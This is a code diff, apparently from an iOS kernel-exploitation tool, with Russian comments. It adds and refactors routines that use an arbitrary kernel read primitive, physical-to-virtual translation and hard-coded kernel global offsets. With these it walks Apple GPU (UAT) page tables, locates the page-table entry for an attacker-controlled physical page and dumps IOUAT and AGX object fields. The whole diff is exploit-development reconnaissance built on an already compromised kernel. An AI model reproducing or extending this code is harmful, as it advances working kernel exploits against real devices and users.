@@ -5226,6 +5226,43 @@ static void *kpParkWorker(void *arg)
     return r;
 }
 
+// Полный walk+скан одного mapper'а: L1arr → L2 → L3 → наш PTE, скан L3 по PA.
+static void kpUatWalkScan(NSMutableString *r, uint64_t mapper, uint64_t gpuVA, uint64_t pa0, const char *label)
+{
+    extern uint64_t kp_rc_kread64(uint64_t);
+    if (!kpLooksLikeKernelPointer(mapper)) { kpNote(r, [NSString stringWithFormat:@"  walk[%s]: mapper невалиден", label]); return; }
+    kpNote(r, [NSString stringWithFormat:@"  walk[%s]: mapper=%#llx ops[0]=%#llx", label, mapper, kp_rc_kread64(mapper)]);
+    uint64_t L1arr = kp_untag_ptr(kp_rc_kread64(mapper + 0x30));
+    kpNote(r, [NSString stringWithFormat:@"  walk[%s]: L1arr=%#llx", label, L1arr]);
+    if (!L1arr) return;
+    uint32_t pc = (uint32_t)((gpuVA >> 36) & 0x7FF);
+    uint32_t pd = (uint32_t)((gpuVA >> 25) & 0x7FF);
+    uint32_t pt = (uint32_t)((gpuVA >> 14) & 0x7FF);
+    uint64_t e1 = kp_rc_kread64(L1arr + (uint64_t)pc * 8);
+    uint64_t L2pa = e1 & 0xFFFFFFFFF000ULL;
+    uint64_t L2 = (L2pa && gPrimitives.phystokv) ? gPrimitives.phystokv(L2pa) : 0;
+    kpNote(r, [NSString stringWithFormat:@"  walk[%s]: pc=%u e1=%#llx → L2kv=%#llx", label, pc, e1, L2]);
+    if (!L2) return;
+    uint64_t e2 = kp_rc_kread64(L2 + (uint64_t)pd * 8);
+    uint64_t L3pa = e2 & 0xFFFFFFFFF000ULL;
+    uint64_t L3 = (L3pa && gPrimitives.phystokv) ? gPrimitives.phystokv(L3pa) : 0;
+    kpNote(r, [NSString stringWithFormat:@"  walk[%s]: pd=%u e2=%#llx → L3kv=%#llx", label, pd, e2, L3]);
+    if (!L3) return;
+    uint64_t pte = kp_rc_kread64(L3 + (uint64_t)pt * 8);
+    kpNote(r, [NSString stringWithFormat:@"  walk[%s]: pt=%u PTE=%#llx (наш PA=%#llx)", label, pt, pte, pa0]);
+    int nnz = 0;
+    NSMutableString *nz = [NSMutableString stringWithString:@""];
+    for (int j = 0; j < 2048; j++) {
+        uint64_t e = kp_rc_kread64(L3 + (uint64_t)j * 8);
+        if (!e) continue;
+        if (nnz < 12) [nz appendFormat:@" [%d]=%#llx", j, e];
+        nnz++;
+        if (pa0 && (e & 0xFFFFFFFFF000ULL) == (pa0 & 0xFFFFFFFFF000ULL))
+            kpNote(r, [NSString stringWithFormat:@"  ★ НАШ PTE: %s L3[%d]=%#llx", label, j, e]);
+    }
+    kpNote(r, [NSString stringWithFormat:@"  walk[%s]: L3 живых записей: %d%@", label, nnz, nz]);
+}
+
 #pragma mark - GART recon (IOGPU → AGXSecureGart, read-only)
 
 extern uint64_t kp_rc_kread64(uint64_t);
@@ -5423,52 +5460,16 @@ static void kpDumpPtrFields(NSMutableString *r, uint64_t objVA, const char *name
         kpNote(r, [NSString stringWithFormat:@"  gart+0x278=%#llx gart+0x280=%#llx gpuVA=%#llx",
                    kp_rc_kread64(gart + 0x278), kp_rc_kread64(gart + 0x280), gpuVA]);
         if (kpLooksLikeKernelPointer(uat)) {
-            // Прямой walk (6 чтений): IOUAT+0x20 → mapper; mapper+0x30 → L1arr;
-            // entries промежутков = ФИЗАДРЕСА таблиц (не VA!) → phystokv.
-            uint64_t mapper = kp_untag_ptr(kp_rc_kread64(uat + 0x20));
-            kpNote(r, [NSString stringWithFormat:@"  mapper=%#llx ops=%#llx (ждём slid 0x7ac5820)", mapper,
-                       mapper ? kp_untag_ptr(kp_rc_kread64(mapper)) : 0]);
-            if (!kpLooksLikeKernelPointer(mapper)) { return r; }
-            uint64_t L1arr = kp_untag_ptr(kp_rc_kread64(mapper + 0x30));
-            kpNote(r, [NSString stringWithFormat:@"  L1arr=%#llx", L1arr]);
-            uint32_t pc = (uint32_t)((gpuVA >> 36) & 0x7FF);
-            uint32_t pd = (uint32_t)((gpuVA >> 25) & 0x7FF);
-            uint32_t pt = (uint32_t)((gpuVA >> 14) & 0x7FF);
-            uint64_t e1 = kp_rc_kread64(L1arr + (uint64_t)pc * 8);
-            uint64_t L2pa = e1 & 0xFFFFFFFFF000ULL;
-            uint64_t L2 = gPrimitives.phystokv ? gPrimitives.phystokv(L2pa) : 0;
-            kpNote(r, [NSString stringWithFormat:@"  pc=%u e1=%#llx → L2 pa=%#llx kv=%#llx", pc, e1, L2pa, L2]);
-            uint64_t e2 = L2 ? kp_rc_kread64(L2 + (uint64_t)pd * 8) : 0;
-            uint64_t L3pa = e2 & 0xFFFFFFFFF000ULL;
-            uint64_t L3 = (L3pa && gPrimitives.phystokv) ? gPrimitives.phystokv(L3pa) : 0;
-            kpNote(r, [NSString stringWithFormat:@"  pd=%u e2=%#llx → L3 pa=%#llx kv=%#llx", pd, e2, L3pa, L3]);
-            uint64_t pte = L3 ? kp_rc_kread64(L3 + (uint64_t)pt * 8) : 0;
-            kpNote(r, [NSString stringWithFormat:@"  pt=%u → PTE slot @ %#llx = %#llx (наш PA=%#llx)", pt, L3 ? L3 + pt * 8 : 0, pte, pa0]);
-            // соседние записи L3-таблицы — жива ли она вообще
-            if (L3) {
-                NSMutableString *nz = [NSMutableString stringWithString:@"  L3 nonzero:"];
-                int nnz = 0;
-                for (int j = 0; j < 2048 && nnz < 24; j++) {
-                    uint64_t e = kp_rc_kread64(L3 + (uint64_t)j * 8);
-                    if (e) { [nz appendFormat:@" [%d]=%#llx", j, e]; nnz++; }
-                }
-                if (!nnz) [nz appendString:@" (пустая)"];
-                kpNote(r, nz);
-                // скан L3 по нашему phys-окну (bit0=valid, phys=e&~0xfff)
-                for (int j = 0; j < 2048; j++) {
-                    uint64_t e = kp_rc_kread64(L3 + (uint64_t)j * 8);
-                    if (pa0 && (e & 0xFFFFFFFFF000ULL) == (pa0 & 0xFFFFFFFFF000ULL)) {
-                        kpNote(r, [NSString stringWithFormat:@"  НАШ PTE найден: L3[%d]=%#llx ← наш PA!", j, e]);
-                    }
-                }
-            }
-            // декод phys-окна из живого PTE
-            if (pte) {
-                for (uint32_t sh = 0; sh <= 14; sh++)
-                    if ((pte >> sh) == pa0 || ((pte >> sh) & 0x3FFFFFFFFFFFULL) == (pa0 & 0x3FFFFFFFFFFFULL))
-                        kpNote(r, [NSString stringWithFormat:@"  phys-окно: PA = PTE >> %u", sh]);
-            }
-            // сырой дамп IOUAT (ненулевые qword'ы) — ищем user-side mapper
+            // canary глобалов + глобальный mapper (user-side может быть там)
+            uint64_t canary = kp_rc_kread64(kbase2 + (0xaa2c418 - 0xfffffff007004000));
+            uint64_t gMapper = kp_untag_ptr(kp_rc_kread64(kbase2 + (0xaad63c0 - 0xfffffff007004000)));
+            kpNote(r, [NSString stringWithFormat:@"  canary[0xaa2c418]=%#llx (ждём 0x7FF000000000) · globalMapper=%#llx", canary, gMapper]);
+            // mapper 1: IOUAT+0x20
+            uint64_t mapper1 = kp_untag_ptr(kp_rc_kread64(uat + 0x20));
+            kpUatWalkScan(r, mapper1, gpuVA, pa0, "iouat+20");
+            // mapper 2: global
+            kpUatWalkScan(r, gMapper, gpuVA, pa0, "global");
+            // сырой дамп IOUAT (ненулевые) — для офлайн-разбора
             NSMutableString *ud = [NSMutableString stringWithString:@"  IOUAT nonzero:"];
             int nu = 0;
             for (uint32_t o = 0; o < 0x578 && nu < 48; o += 8) {
@@ -5476,20 +5477,6 @@ static void kpDumpPtrFields(NSMutableString *r, uint64_t objVA, const char *name
                 if (e) { [ud appendFormat:@" +%#x=%#llx", o, e]; nu++; }
             }
             kpNote(r, ud);
-        }
-        // 7. AGXUC: vtable каждого target'а полей — ищем GPU VM объект
-        kpNote(r, @"  --- AGXUC target vtables:");
-        for (uint32_t o = 0; o < 0x138; o += 8) {
-            uint64_t eu = kp_untag_ptr(kp_rc_kread64(agxuc + o));
-            if (!kpLooksLikeKernelPointer(eu)) continue;
-            uint64_t band = (eu >> 32) & 0xff;
-            if (!(band >= 0xdf && band <= 0xe8)) continue;
-            if (kpVAIsEL2Domain(eu)) continue;
-            uint64_t pa3 = kvtophys(eu);
-            if (!pa3 || !kpPAIsManaged(pa3)) continue;
-            uint64_t vt = kp_untag_ptr(kp_rc_kread64(eu));
-            kpNote(r, [NSString stringWithFormat:@"    uc+%#04x → %#llx  vt=%#llx (unslid %#llx)", o, eu, vt,
-                       vt ? vt - slide2 : 0]);
         }
     }
     return r;
